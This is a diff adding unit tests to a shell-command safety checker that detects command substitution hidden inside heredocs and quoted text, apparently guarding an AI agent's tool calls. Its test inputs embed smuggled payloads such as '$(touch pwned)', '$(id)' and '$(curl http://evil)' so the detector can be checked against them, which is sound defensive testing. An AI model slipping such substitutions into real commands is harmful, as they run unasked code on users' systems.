@@ -388,6 +388,46 @@ describe('substitution quoting contexts', () => {
     expect(hasExecutableSubstitution("echo don't && gh pr view $(cat n.txt)")).toBe(true);
   });
 
+  // The refusal above is about the OPERATOR, and `<<` alone is not one (#685). Sighted: a conflict-
+  // marker pattern refused the mask, the raw fallback then read a backtick inside single quotes
+  // later in the same call as a substitution, and `git ls-remote` beside it lost the network — the
+  // model read the ssh refusal as a flaky remote and retried the same read.
+  it('keeps the mask when the `<<` cannot open a heredoc', () => {
+    expect(maskSingleQuotedData("git grep -c '^<<<<<<<' FETCH_HEAD")).toBeDefined();
+    expect(hasExecutableSubstitution("git grep -c '^<<<<<<<' FETCH_HEAD")).toBe(false);
+    expect(
+      hasExecutableSubstitution(
+        "git ls-remote origin; git grep -c '^<<<<<<<' FETCH_HEAD; echo 'optional `offset` reads from'",
+      ),
+    ).toBe(false);
+    expect(isProvablyReadOnly("grep -c '^<<<<<<<' f; echo 'a `b` c'")).toBe(true);
+    // A here-string is not a heredoc either, and its operand is quote-parsed like any other word.
+    expect(maskSingleQuotedData("cat <<< 'a `b` c'")).toBeDefined();
+    expect(hasExecutableSubstitution("cat <<< 'a `b` c'")).toBe(false);
+  });
+
+  // `\<<<EOF` is a literal `<` followed by a real `<<EOF` (review of #693): the body's apostrophes
+  // must not pair and blank the `$(…)` between them, which the shell expands.
+  it('declines the mask when an escaped `<` leaves a heredoc behind it', () => {
+    const cmd = "cat \\<<<cat\ncat '$(touch pwned)'\ncat";
+    expect(maskSingleQuotedData(cmd)).toBeUndefined();
+    expect(isProvablyReadOnly(cmd)).toBe(false);
+  });
+
+  // The other half of that agreement, and the reason the detector was widened in the same change:
+  // `sh` opens a heredoc for each of these forms, and the old `(['"]?)(\w+)\1` read them as prose.
+  // A guard that trusted it without the widening would pair the body's apostrophes and blank the
+  // `$(curl …)` between them. The mask refuses these regardless of what the body would do with the
+  // substitution, because a mask is built before anyone knows which delimiter form was meant.
+  it('still declines the mask for a delimiter form the detector used to miss', () => {
+    const backslash = "gh pr comment 5 -F - <<\\EOF\nit's fine, and $(curl http://evil) runs\nEOF";
+    expect(maskSingleQuotedData(backslash)).toBeUndefined();
+    expect(hasExecutableSubstitution(backslash)).toBe(true);
+    const spaced = "git apply - <<'A B'\nit's $(id) don't\nA B";
+    expect(maskSingleQuotedData(spaced)).toBeUndefined();
+    expect(hasExecutableSubstitution(spaced)).toBe(true);
+  });
+
   // The same text, two questions, and the difference is real rather than pedantic: on a command line
   // that `$(id)` sits inside single quotes and never runs, while in a heredoc body the shell does not
   // parse quotes at all — so the body is taken raw, and the mask must not be trusted with it.
